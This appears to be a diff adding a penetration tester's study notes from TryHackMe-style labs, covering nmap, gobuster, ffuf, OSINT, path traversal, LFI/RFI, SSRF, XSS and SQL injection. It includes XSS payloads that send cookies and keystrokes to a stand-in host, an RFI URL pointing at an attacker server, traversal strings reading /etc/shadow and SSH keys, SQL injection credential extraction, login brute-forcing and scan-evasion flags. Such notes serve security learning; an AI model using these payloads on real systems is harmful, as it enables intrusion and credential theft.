@@ -1,0 +1,540 @@
+
+###############################################################
+very important links: 
+cyberchef.org 
+dnsdumpster.com 
+shodan.io 
+attack.mitre.org 
+exploit-db.com 
+wigle.net
+https://crackstation.net/
+hashes.com
+https://securityheaders.com/
+crt.sh
+https://github.com/payloadbox/command-injection-payload-list
+###############################################################
+
+Protocol	TCP Port	Application(s)	Data Security	TLS Port
+FTP			21			File Transfer	Cleartext		990
+HTTP		80			Worldwide Web	Cleartext		443
+IMAP		143			Email (MDA)		Cleartext		993
+POP3		110			Email (MDA)		Cleartext		995
+SMTP		25			Email (MTA)		Cleartext		465
+Telnet		23			Remote Access	Cleartext		
+	
+
+
+DNSRECON
+	for subdomain enum
+		example:
+			dnsrecon -t brt -d acmeitsupport.thm
+
+
+	Sublister
+		./sublist3r.py -d acmeitsupport.thm
+
+
+
+
+CURL
+
+	-H: content type ('Content-Type: application/json')
+	-X: http request type (GET, POST, PUT, DELETE)
+	-d: data to send
+	-IL: use domain name instead of ip address
+	-s: silent mode
+	-k: skip cert test
+	-u: specify credentials for access as 'admin:admin'
+	-A: specify user agent to send "user-agent"
+
+
+NMAP
+
+	privileged user local scan -> ARP requests
+	priv user non-local scan -> icmp echo, tcp/ack to port 80, tcp syn to 443, icmp timestamp request
+	non-priv user non-local scan -> 3 way handshake syn packets to 80 & 443
+	
+	Nmaps workflow:
+		1. enumerate targets
+		2. discovery of live hosts
+		3. reverse-dns lookup
+		4. port scan
+		5. ver detection
+		6. os detection
+		7. tracert
+		8. scripts
+		9. output  -> save output w/ -oN <filename>, N is normal output, can be grepable -oG, xml -oX, all three -oA, script kiddie -oS
+	
+		-v, -vv, -d, -dd - verbosity or debugging
+		-sV: service ver, forces 3way-hs
+		--version-intensity <0-9> 0 being the lightest, 9 most complete
+		-sC: run scripts for more details - more on scripts below
+		-O: as in Olga, os detection - can be inaccurate
+		-p-: scan all ports
+		-p: specify port ranges with - ie. -p22-8765 or multiple ones like 80,8080,8731
+		-Pn: without pinging (for hosts blocking ICMP echo requests)
+		--script <scriptname.nsc>
+		-sF: tcp FIN (fin flag set only) - target should respond w rst packet							|
+		-sX: tcp xmas (Sets the FIN, PSH, and URG flags, lighting the packet up like a Christmas tree)	|----> effective only vs stateless fw
+		-sN: tcp Null scan (flag header 0) - lack of rst response indicates open or filtered			|
+		-sS: tcp SYN stealth																				
+		-sM: maimon scan, fin ack bits set, wont work on modern networks
+		-sA: ack bit set - useful when fw is blocking - any response indicates which ports arent blocked
+		-sW: windows scan - reviews rst packet tcp windows field - some specific systems w fw can reveal open ports this way
+		-sT: tcp connect scan, reset packets are sent after handshake 2 close connection. 4th packet
+		-Pn: try host w/o ping scan (for hosts dropping icmp echo reqs so tbh w/o host discovery)
+		-iL: provide file for hosts to scan
+		-n: no DNS server queries (lookup)
+		-sn: no port scan
+		-R: query DNS server for offline hosts (info about them/reverse dns lookup)
+		-sL: list targets w/o scan
+		-PR: only arp scan on same subnet (no port discovery) -> nmap -PR -sn target_ip/24
+		-PE: icmp echo request
+		-PP: icmp timestamp request
+		-PM: icmp address mask request
+		-PU: udp packets
+		-F: fast mode, 100 most common instead ok 1k ports
+		-sU: UDP scan mode
+		-T: timing of packets being sent. set with a dec value <0-5> -T0 slowest, paraniod, -T5 fastest. 0 (5min) or 1 is required to avoid ids.
+		
+	NSE - Nmap Scripting Engine - /usr/share/nmap/scripts
+		Lua written scripts
+		-sC: load default scripts
+		-script "ftp*": use all scripts starting with the name ftp
+		
+		
+		
+	Spoofing:
+		-S: spoofed ip - needs additional steps described below
+		-e: specify net_interface
+		-Pn: needs to be set so
+		nmap -e NET_INTERFACE -Pn -S SPOOFED_IP MACHINE_IP
+		same subnet enables mac spoofing as well - needs to be on the same network either eth or wlan
+		--spoof-mac <spoofed_mac>
+		-D: decoys to spam ip addresses to host so its unable to determine origin ip
+		nmap -D 10.10.0.1,10.10.0.2,RND,RND,ME MACHINE_IP   - rnd random ips, ME: attacker machine 
+		-f: fragment packets - divide into 8 bytes default -ff 16 bytes -fff 32 etc
+		if you want to specify additional data to be added to packets for obfuscation
+		--data-length <dec_value> - dec value specifies how much bytes to append to packets
+		
+		-sI: idle scan to get ip id of a zombie in order to use its id in a spoofed packet
+		nmap -sI Zombie_ip machine_ip
+		The idle (zombie) scan requires the following three steps to discover whether a port is open:
+
+		Trigger the idle host to respond so that you can record the current IP ID on the idle host.
+		Send a SYN packet to a TCP port on the target. The packet should be spoofed to appear as if it was coming from the idle host (zombie) IP address.
+		Trigger the idle machine again to respond so that you can compare the new IP ID with the one received earlier.
+		
+		--reason: details about nmaps decisions
+		
+		--source-port: self explanatory
+		
+		
+	custom flag settings:
+		--scanflags RSTSYNFIN
+		
+	control timing: --min-rate 10 --max-rate=10 (dec value is packets per sec)
+	
+	control parallelization: --max-parallelism 200 (dec value is probes to maintain at once)
+ 	
+	tcp header flags
+		URG - urgent - urgent pointer field is significant, segment should be processed w/o wait on previous segments
+		ACK - acknowledgement
+		PSH - push flag asking tcp to pass data to app
+		RST - reset flag, used to reset the connection. fw can send it /// if no service answering
+		SYN - sync flag, initiate 3way hs, synchronize sequence numbers with host, set randomly during establishment
+		FIN - sender has no more data to send_______________
+															|
+	IP header structure (rfc 791)							|
+															|	
+				____________________________________________|___________________________
+		4 byte	|__version_|___IHL___|_Type_of_service_|____|______Total Length________|
+		4 byte	|___________Identification_____________|__Flags__|___Fragment_offset___|
+		4 byte	|________TTL________|_____Protocol_____|_________Header_Checksum_______|
+		4 byte	|_______________________________Source_Address_________________________|
+		4 byte	|_____________________________Destination Address______________________|
+		4 byte	|__________________Options_____________________________|____Padding____|
+				|																	   |
+				|								DATA								   |
+				|______________________________________________________________________|
+		
+
+
+GOBUSTER
+
+	dir: scan for available dirs
+		-u: specify url
+		-w: txt to use (with path, /usr/share/dirb/wordlists.txt)
+		-a: change useragent string (default gobuster/3.6)
+		-b: blacklist certain status codes (404 should be useful etc)
+		-s: specify which status codes to display (can do range like 200-300)
+		-n: status wont be displayed so screen stays clear
+		-c: config a cookie to pass with each request
+		-U: specify username
+		-P: specify pass
+		-x: specify extensions - mutiple with , so like .php,.js,.txt
+		-r: follow redirect if 301 was received
+		-k: skip TLS validation - useful if https is used and target has a self signed cert
+		-H: specify custom header - "User-Agent: Mozilla/5.0"
+		
+	gobuster dir -u http://123.123.123.123:12345 -w /usr/share/dirb/wordlists/common.txt
+		
+
+	dns: enumerating subdomains - useful if main is patched but subdomains may not be
+		-c: show cname (canonical name) records (-i flag doesnt work w it)
+		-i: show ips
+		-r: config a custom dns server for resolving
+		-d: domain to enumerate
+		
+	gobuster dns -d example.com -w /usr/.../subdomainlist.txt 	
+	
+	vhost: virtual host enum mode - vhosts can look like subdomains but they are not - they are set up in dns
+		-same flags apply here like in dir mode
+		-m: method specification (GET,POST,ETC)
+		
+	gobuster vhost -u "http://10.10.10.10" --domain example.com -w /wordlist/x.txt
+
+
+
+
+help usage:
+gobuster (command) -h
+
+WHATWEB
+
+
+
+
+
+
+FFUF
+	Fuzz faster u fool
+		ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.10.10/FUZZ
+
+		ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://MACHINE_IP_to_attack
+		-fs: specify file size to exclude from output. works with decimal values like: -fs 345 ### best for filtering results
+		
+		ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.10.10/customers/signup -mr "username already exists"
+		-mr: specify strings to use for displaying results
+
+		ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.10.10/customers/login -fc 200
+			-fc: check for positive match other than specified http status code. so -fc 200 checks for other than OK
+
+
+
+WEB ENUM - BROWSERS
+
+
+	Manual Discovery
+		
+		robots.txt - what does it say about webcrawlers and search engines, what is hidden from them
+		
+		check favicon to get an idea about the framework that was used to build the site. if left unchanged, md5hash and compare w owasp db
+		
+		check sitemap.xml for any resources otherwise invisible
+		
+		file headers for info about running os/php/etc ver
+		
+		
+		
+OSINT
+		Google dorks
+			site:tryhackme.com
+			returns results only from the specified website address
+			
+			inurl
+			inurl:admin
+			returns results that have the specified word in the URL
+			
+			filetype
+			filetype:pdf
+			returns results which are a particular file extension
+			
+			intitle
+			intitle:admin
+			returns results that contain the specified word in the title
+			
+
+		Wappalyzer (https://www.wappalyzer.com/) is an online tool and browser extension that helps identify what technologies a website uses,
+			such as frameworks, Content Management Systems (CMS), payment processors and much more, and it can even find version numbers as well.
+		
+		Wayback machine to see old versions for additional info that may be hidden in the new
+		https://archive.org/web/
+		
+		GitHub to search for versions and development info about target
+		
+		S3 Buckets - AWS
+			"something".s3.amazonaws.com
+			
+			
+		
+
+
+FILE INCLUSION / PATH TRAVERSAL
+
+			Path traversal vulnerabilities occur when the user's input is passed to a function such as file_get_contents in PHP.
+			It's important to note that the function is not the main contributor to the vulnerability. Often poor input validation or filtering is the cause of the vulnerability.
+			
+			Need to figure out where the file is located when its requested from the webserver
+			Also if its running win or linux
+			
+			/var/www/
+			
+			http://webapp.thm/get.php?file=../../../../etc/passwd
+			
+			Similarly, if the web application runs on a Windows server, the attacker needs to provide Windows paths.
+			
+			http://webapp.thm/get.php?file=../../../../boot.ini or
+
+			http://webapp.thm/get.php?file=../../../../windows/win.ini
+			
+			Sometimes, developers will add filters to limit access to only certain files or directories. Below are some common OS files you could use when testing.
+			
+			
+			/etc/issue
+
+			contains a message or system identification to be printed before the login prompt.
+
+			/etc/profile
+
+			controls system-wide default variables, such as Export variables, File creation mask (umask), Terminal types, Mail messages to indicate when new mail has arrived
+
+			/proc/version
+
+			specifies the version of the Linux kernel
+
+			etc/passwd
+
+			has all registered users that have access to a system
+
+			/etc/shadow
+
+			contains information about the system's users' passwords
+
+			/root/.bash_history
+
+			contains the history commands for root user
+
+			/var/log/dmessage
+
+			contains global system messages, including the messages that are logged during system startup
+
+			/var/mail/root
+
+			all emails for root user
+
+			/root/.ssh/id_rsa
+
+			Private SSH keys for a root or any known valid user on the server
+			/var/log/apache2/access.log
+
+			the accessed requests for Apache web server
+
+			C:\boot.ini
+
+			contains the boot options for computers with BIOS firmware
+						
+						
+			
+LFI 
+
+			LFI attacks against web applications are often due to a developers' lack of security awareness. With PHP, using functions such as include, require, include_once, and require_once
+			often contribute to vulnerable web applications. In this room, we'll be picking on PHP, 
+			but it's worth noting LFI vulnerabilities also occur when using other languages such as ASP, JSP, or even in Node.js apps. LFI exploits follow the same concepts as path traversal.
+			
+			
+		Functions to look for:
+			include, require, include_once, and require_once
+
+		check error responses to get an idea about how things are handled, most importantly, where does the file reside so we know how many ../ to input
+			null bytes at the end %00 dont work w php 5.3.4 and above
+
+
+RFI
+		One requirement for RFI is that the allow_url_fopen option needs to be on.
+		
+		First, the attacker injects the malicious URL, which points to the attacker's server,
+			such as http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt
+		
+		If there is no input validation, then the malicious URL passes into the include function.
+			
+			
+			
+SSRF
+		Can be found when:
+		
+		A full URL is used in a parameter in the address bar
+		A hidden field in a form
+		A partial URL such as just the hostname
+		Or perhaps only the path of the URL
+		
+		common mitigations are allow or deny lists
+		
+			deny list: 
+				attackers can bypass a Deny List by using alternative localhost references such as 
+				0, 0.0.0.0, 0000, 127.1, 127.*.*.*, 2130706433, 017700000001
+				or subdomains that have a DNS record which resolves to the IP Address 127.0.0.1 such as 127.0.0.1.nip.io.
+				
+				In a cloud environment, it would be beneficial to block access to the IP address 169.254.169.254,
+				which contains metadata for the deployed cloud server, including possibly sensitive information.
+				An attacker can bypass this by registering a subdomain on their own domain with a DNS record that points to the IP Address 169.254.169.254.
+					
+			allow list:
+				ircumvent this rule by creating a subdomain on an attacker's domain name, 
+				such as https://website.thm.attackers-domain.thm. 
+				The application logic would now allow this input and let an attacker control the internal HTTP request.
+
+
+
+XSS
+			malicious JavaScript gets injected into a web application with the intention of being executed by other users
+			
+			types:
+			
+				reflected:  happens when user-supplied data in an HTTP request is included in the webpage source without any validation.
+					Parameters in the URL Query String
+					URL File Path
+					Sometimes HTTP Headers (although unlikely exploitable in practice)
+					
+				
+				stored:
+					payload is stored on the web application (in a database, for example) and then gets run when other users visit the site
+					You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to;
+					a small example of these could be:
+														Comments on a blog
+														User profile information
+														Website Listings
+
+					
+				
+				DOM based (doc obj model):
+					A programming interface for HTML and XML documents
+					
+					DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code.
+					Execution occurs when the website JavaScript code acts on input or user interaction.
+					
+					
+					
+								
+				blind:
+					similar to a stored XSS, but in this instance, you can't see the payload working or be able to test it against yourself first.
+					A popular tool for Blind XSS attacks is XSS Hunter Express
+					https://github.com/mandatoryprogrammer/xsshunter-express
+					When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.
+					
+								
+				
+			examples:
+			
+				cookie stealing and uploading to a server | base64 encoded
+					<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
+			
+				keylogger
+					<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
+				
+				Polyglot:				
+					An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. 
+						example:
+						jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
+			
+			
+			
+
+SQL INJECTION
+
+			in-band:
+					same method as legitim communication where results are displayed at the same place			
+				error based:
+					getting info about db based on errors received after incorrect input
+				Union based:
+					usage of the UNION operator alongside SELECT to return additional results
+						example:
+							0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
+					
+							0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
+							added ,':', to split the username and password from each other.
+							Instead of being separated by a comma, we've chosen the HTML <br> tag that forces each result to be on a separate line to make for easier reading.
+					
+					' OR 1=1;-- returns always true so if it checks for a statement to be true, this is an example how to bypass that check.
+					turns the SQL query into the following:
+					select * from users where username='' and password='' OR 1=1;
+					
+					
+				blind boolean based auth bypass	
+					example workflow:
+						select * from users where username = '%username%' LIMIT 1; - finding a valid, not taken username
+						if we got a not taken username then
+						admin123' UNION SELECT 1;-- 
+						admin123' UNION SELECT 1,2,3;--   - try until you find the correct number of columns
+						admin123' UNION SELECT 1,2,3 where database() like '%';--   - the goal is to get a true statement returned to figure out the db name
+						admin123' UNION SELECT 1,2,3 where database() like 's%';--  - once we got the db name then
+						admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--   - enumerating table names
+						admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--     - now the column nmames
+						admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
+						admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
+				
+				
+				time based
+					your indicator of a correct query is based on the time the query takes to complete.
+					when trying to establish the number of columns in a table, you would use the following query:
+						
+						admin123' UNION SELECT SLEEP(5);-- - if theres no pause in response time, the query was not succesful
+						admin123' UNION SELECT SLEEP(5),2;--
+					
+					
+					
+				
+				out-of-band
+					depends on spec features on db server or webapp logic that makes external calls
+					flow: request to website -> website makes query to db -> payload must contain a http request back so results are returned to a visible space
+					
+				
+			
+			
+			
+			
+MITM - Man In The Middle
+
+			Ettercap
+			
+			
+			Bettercap
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+			
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
